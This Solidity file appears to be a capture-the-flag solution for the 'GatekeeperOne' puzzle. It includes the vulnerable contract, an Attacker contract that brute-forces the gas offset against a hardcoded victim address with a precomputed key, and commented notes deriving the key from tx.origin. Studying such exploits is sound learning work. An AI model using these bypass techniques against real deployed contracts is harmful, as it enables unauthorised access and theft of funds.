// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol";

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, '1');
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0, '2');
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attacker {
    event Success(uint gas);
    event Failed(bytes reasons, uint gas);

    GatekeeperOne victim = GatekeeperOne(0xBEc7101BA300F2b0d2aE28f7A59b06208951e348);

    uint public GAS = 100000;
    bytes8 public KEY = 0x058C94E500004cBC;

    function attack() public {
      for(uint i = 0; i<8191 ; i++) {
        try victim.enter{gas: GAS + i}(KEY){
          GAS = GAS+i;
          emit Success(GAS);
          break;
        } catch (bytes memory r){
          emit Failed(r, GAS+i);
        }
      }
    }
}


// key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

// function keyGuess() public returns (uint16){
      // tx.origin = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
      // o1 = uint64(o);   // 3FCB875F56BEDDC4 (4596916688208715204)
      // o2 = uint32(o);   // 56BEDDC4 (1455349188)
      // o3 = uint16(o);   // DDC4 (56772)

      // key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

      // bytes8 key = bytes8(tx.origin);

      // require(uint32(uint64(key)) == uint16(uint64(key)), "GatekeeperOne: invalid gateThree part one");   // 3FCB875F_0000_DDC4
      // require(uint32(uint64(key)) != uint64(key), "GatekeeperOne: invalid gateThree part two");           // 3FCB875F_0000_DDC4
      // require(uint32(uint64(key)) == uint16(tx.origin),"GatekeeperOne: invalid gateThree part three");
    //   return uint16(tx.origin);
    // }